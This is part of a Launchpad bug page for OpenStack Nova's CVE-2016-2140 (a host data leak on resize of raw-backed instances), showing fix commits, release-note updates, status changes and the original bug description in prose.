  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/291221">https:/<wbr />/review.<wbr />openstack.<wbr />org/291221</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/nova/commit/?id=0b194187db9da28225cb5e62be3b45aff5a1c793">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />nova/commit/<wbr />?id=0b194187db9<wbr />da28225cb5e62be<wbr />3b45aff5a1c793</a><br />
Submitter: Jenkins<br />
Branch:    stable/liberty</p>
<p>commit 0b194187db9da28<wbr />225cb5e62be3b45<wbr />aff5a1c793<br />
Author: Matt Riedemann &lt;email address hidden&gt;<br />
Date:   Thu Mar 10 10:07:11 2016 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add release note for CVE <a href="/bugs/1548450" class="bug-link">bug 1548450</a></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This will go into the 12.0.3 release.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I3792dcdd9f8755<wbr />6b9de435818cec1<wbr />700630a7b26<br />
&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #1548450</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/291221
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=0b194187db9da28225cb5e62be3b45aff5a1c793
Submitter: Jenkins
Branch:    stable/liberty

commit 0b194187db9da28225cb5e62be3b45aff5a1c793
Author: Matt Riedemann &lt;mriedem@us.ibm.com&gt;
Date:   Thu Mar 10 10:07:11 2016 -0500

    Add release note for CVE bug 1548450
    
    This will go into the 12.0.3 release.
    
    Change-Id: I3792dcdd9f87556b9de435818cec1700630a7b26
    Related-Bug: #1548450
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/69" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-10T21:52:27.161059+00:00" title="2016-03-10 21:52:27 UTC">on 2016-03-10</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/69">
                <strong>Related fix merged to nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/69"> #69</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/291208">https:/<wbr />/review.<wbr />openstack.<wbr />org/291208</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/nova/commit/?id=9c0bbda07fdcf134308371644d09becbb18c62b1">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />nova/commit/<wbr />?id=9c0bbda07fd<wbr />cf134308371644d<wbr />09becbb18c62b1</a><br />
Submitter: Jenkins<br />
Branch:    master</p>
<p>commit 9c0bbda07fdcf13<wbr />4308371644d09be<wbr />cbb18c62b1<br />
Author: Matt Riedemann &lt;email address hidden&gt;<br />
Date:   Thu Mar 10 09:35:00 2016 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add release notes for security fixes in 13.0.0 mitaka GA</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;There are three security issues fixed in mitaka.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;The first two were documented for liberty 12.0.1 but we<br />
&nbsp;&nbsp;&nbsp;&nbsp;apparently forgot to doc them for mitaka.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #1524274<br />
&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #1516765<br />
&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #1548450</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I3eba75f1fc86c4<wbr />c9abd258042dfaf<wbr />c6df1f2405c</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/291208
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=9c0bbda07fdcf134308371644d09becbb18c62b1
Submitter: Jenkins
Branch:    master

commit 9c0bbda07fdcf134308371644d09becbb18c62b1
Author: Matt Riedemann &lt;mriedem@us.ibm.com&gt;
Date:   Thu Mar 10 09:35:00 2016 -0500

    Add release notes for security fixes in 13.0.0 mitaka GA
    
    There are three security issues fixed in mitaka.
    
    The first two were documented for liberty 12.0.1 but we
    apparently forgot to doc them for mitaka.
    
    Related-Bug: #1524274
    Related-Bug: #1516765
    Related-Bug: #1548450
    
    Change-Id: I3eba75f1fc86c4c9abd258042dfafc6df1f2405c
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2016-03-14 15:06:23 UTC" datetime="2016-03-14T15:06:23.005144+00:00">on 2016-03-14</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/70" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~doug-hellmann" class="sprite person">Doug Hellmann (doug-hellmann)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-05-10T13:37:53.196329+00:00" title="2016-05-10 13:37:53 UTC">on 2016-05-10</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/70">
                <strong>Fix included in openstack/nova 2015.1.4</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/70"> #70</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/nova 2015.1.4 release.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/nova 2015.1.4 release.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/71" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-10T00:55:59.577338+00:00" title="2016-11-10 00:55:59 UTC">on 2016-11-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/71"> #71</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/nova 2015.1.4 release.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/nova 2015.1.4 release.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/nova/+bug/1548450/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/nova/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/nova/+bug/1548450/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/nova/+bug/1548450/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/nova/+bug/1548450/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/nova/+bug/1548450/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/nova/+bug/1548450/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/nova/+bug/1548450/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/nova/+bug/1548450/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/nova/+bug/1548450/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/nova/+bug/1548450/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/nova/+bug/1548450/+attachment/4588377/+files/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch">0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch</a>
        <small>
          (<a href="/nova/+bug/1548450/+attachment/4588377">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/nova/+bug/1548450/+attachment/4588378/+files/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch">0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch</a>
        <small>
          (<a href="/nova/+bug/1548450/+attachment/4588378">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/nova/+bug/1548450/+attachment/4588379/+files/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch">0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch</a>
        <small>
          (<a href="/nova/+bug/1548450/+attachment/4588379">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/nova/+bug/1548450/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  


      

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"bug_is_private": false, "information_type_data": {"PUBLICSECURITY": {"name": "Public Security", "description_css_class": "choice-description", "is_private": false, "value": "PUBLICSECURITY", "description": "Everyone can see this security related information.\n", "order": 1}, "PRIVATESECURITY": {"name": "Private Security", "description_css_class": "choice-description", "is_private": true, "value": "PRIVATESECURITY", "description": "Only the security group can see this information.\n ", "order": 2}, "PUBLIC": {"name": "Public", "description_css_class": "choice-description", "is_private": false, "value": "PUBLIC", "description": "Everyone can see this information.\n", "order": 0}, "USERDATA": {"name": "Private", "description_css_class": "choice-description", "is_private": true, "value": "USERDATA", "description": "Only shared with users permitted to see private user information.\n", "order": 3}}, "initial_comment_batch_offset": 41, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1548450", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1548450"}, "first visible_recent_comment": 31, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1548450", "web_link": "https://bugs.launchpad.net/bugs/1548450", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1548450, "private": false, "information_type": "Public", "name": null, "title": "[OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)", "description": "First, a caveat. This report is from code inspection only. I haven't attempted to replicate it, and I have no immediate plans to. It's possible it doesn't exist due to an interaction which isn't immediately obvious.\n\nWhen resizing an instance using the libvirt driver, we run LibvirtDriver.migrate_disk_and_power_off on the source host. If there is no shared storage, data is copied. Specifically, there's a loop in that function which loops over disk info:\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for info in disk_info:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# assume inst_base == dirname(info['path'])\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0...\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0copy the disk\n\nNote that this doesn't copy disk.info, because it's not a disk. I have actually confirmed this whilst investigating another bug.\n\nThe problem with this is that disk.info contains file format information, which means that when the instance starts up again, the format of all its disks are re-inspected. This is the bug. It means that a malicious user can write data to an ephemeral or root disk which fakes a qcow2 header, and on re-inspection it will be detected as qcow2 and data from a user-specified backing file will be served.\n\nI am moderately confident that this is a real bug.\n\nUnlike the previous file format bug I reported, though, this bug would be mitigated by the fact that the user would have to access the disk via libvirt/qemu. Assuming they haven't disabled SELinux (nobody does that, right?) this severely limits the data which can be accessed, possibly to the point that it isn't worth exploiting. I also believe it would only be exploitable on deployments using raw storage, which I believe isn't common.\n\nGiven that I don't think it's all that serious in practise, I'm not going to work on this immediately as I don't have the time. If it's still around when I'm less busy I'll pick it up.", "owner_link": "https://bugs.launchpad.net/api/devel/~mbooth-9", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/bug_tasks", "duplicate_of_link": null, "date_created": "2016-02-22T18:14:34.238448+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/subscriptions", "date_last_updated": "2017-06-16T12:12:24.753467+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 18, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/attachments", "security_related": false, "latest_patch_uploaded": "2016-03-04T15:06:09.324092+00:00", "tags": ["in-stable-kilo", "in-stable-liberty"], "date_last_message": "2016-11-10T00:55:59.577338+00:00", "number_of_duplicates": 0, "message_count": 72, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1548450/linked_merge_proposals", "http_etag": "\"4385dabc37d6073f4a9422b69a00197f9ec20317-3bddbefbb8dc5c87f8526d44b1170f16f4f97b8b\""}, "total_comments_and_activity": 123, "related_features": {}, "context": {"self_link": "https://bugs.launchpad.net/api/devel/nova/+bug/1548450", "web_link": "https://bugs.launchpad.net/nova/+bug/1548450", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1548450", "milestone_link": null, "status": "Fix Released", "importance": "Critical", "assignee_link": "https://bugs.launchpad.net/api/devel/~lyarwood", "bug_target_display_name": "OpenStack Compute (nova)", "bug_target_name": "nova", "bug_watch_link": null, "date_assigned": "2016-03-08T15:02:15.066673+00:00", "date_created": "2016-02-22T18:14:34.238448+00:00", "date_confirmed": "2016-02-23T19:57:44.661166+00:00", "date_incomplete": null, "date_in_progress": "2016-03-08T15:02:15.103533+00:00", "date_closed": "2016-03-09T12:59:02.187601+00:00", "date_left_new": "2016-02-23T19:57:44.661166+00:00", "date_triaged": "2016-03-08T15:02:15.103533+00:00", "date_fix_committed": "2016-03-09T12:59:02.187601+00:00", "date_fix_released": "2016-03-09T12:59:02.187601+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~mbooth-9", "target_link": "https://bugs.launchpad.net/api/devel/nova", "title": "Bug #1548450 in OpenStack Compute (nova): \"[OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/nova/+bug/1548450/related_tasks", "is_complete": true, "http_etag": "\"8ce148b5280262c13564bad60948de449c9d8446-6b346f3c1f375535939cc4fe72ea864d19db77fe\""}, "bugtask_data": {"2017128": {"bugtask_path": "/nova/liberty/+bug/1548450", "bug_title": "[OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)", "user_can_delete": false, "milestone_value": null, "milestone_widget_items": "[]", "importance_widget_items": "[]", "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_assignee": false, "targetname": "OpenStack Compute (nova) liberty", "hide_assignee_team_selection": true, "assignee_is_team": false, "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/nova/liberty/+bug/1548450/+delete", "row_id": "tasksummary2017128", "target_is_product": false, "id": 2017128, "form_row_id": "task2017128", "assignee_vocabulary_filters": [], "prefix": "nova_liberty", "importance_value": "Critical", "status_value": "Fix Released", "assignee_value": "lyarwood", "user_can_edit_milestone": false, "user_can_unassign": false, "user_can_edit_status": true, "user_can_edit_importance": false}, "2004858": {"bugtask_path": "/nova/+bug/1548450", "bug_title": "[OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)", "user_can_delete": false, "milestone_value": null, "milestone_widget_items": "[]", "importance_widget_items": "[]", "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_assignee": false, "targetname": "OpenStack Compute (nova)", "hide_assignee_team_selection": true, "assignee_is_team": false, "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/nova/+bug/1548450/+delete", "row_id": "tasksummary2004858", "target_is_product": true, "id": 2004858, "form_row_id": "task2004858", "assignee_vocabulary_filters": [], "prefix": "nova", "importance_value": "Critical", "status_value": "Fix Released", "assignee_value": "lyarwood", "user_can_edit_milestone": false, "user_can_unassign": false, "user_can_edit_status": true, "user_can_edit_importance": false}, "2004890": {"bugtask_path": "/ossa/+bug/1548450", "bug_title": "[OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)", "user_can_delete": false, "milestone_value": null, "milestone_widget_items": "[]", "importance_widget_items": "[]", "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_assignee": false, "targetname": "OpenStack Security Advisory", "hide_assignee_team_selection": true, "assignee_is_team": null, "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ossa/+bug/1548450/+delete", "row_id": "tasksummary2004890", "target_is_product": true, "id": 2004890, "form_row_id": "task2004890", "assignee_vocabulary_filters": [], "prefix": "ossa", "importance_value": "Critical", "status_value": "Fix Released", "assignee_value": null, "user_can_edit_milestone": false, "user_can_unassign": false, "user_can_edit_status": true, "user_can_edit_importance": false}, "2017127": {"bugtask_path": "/nova/kilo/+bug/1548450", "bug_title": "[OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)", "user_can_delete": false, "milestone_value": "https://bugs.launchpad.net/api/devel/nova/+milestone/2015.1.4", "milestone_widget_items": "[]", "importance_widget_items": "[]", "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_assignee": false, "targetname": "OpenStack Compute (nova) kilo", "hide_assignee_team_selection": true, "assignee_is_team": false, "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/nova/kilo/+bug/1548450/+delete", "row_id": "tasksummary2017127", "target_is_product": false, "id": 2017127, "form_row_id": "task2017127", "assignee_vocabulary_filters": [], "prefix": "nova_kilo", "importance_value": "Critical", "status_value": "Fix Released", "assignee_value": "lyarwood", "user_can_edit_milestone": false, "user_can_unassign": false, "user_can_edit_status": true, "user_can_edit_importance": false}}};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 62 queries/external actions issued in 1.42 seconds

    Features: {'app.mainsite_only.canonical_url': None, 'disclosure.dsp_picker.enabled': 'on', 'bugs.affected_count_includes_dupes.disabled': None, 'baselayout.careers_link.disabled': None, 'js.yui_version': None, 'profiling.enabled': None, 'visible_render_time': None, 'hard_timeout': '9000', 'bugs.nominations.bug_supervisors_can_target': 'on', 'app.maintenance_message': None}

    r0d8de2b

    -->

</html>

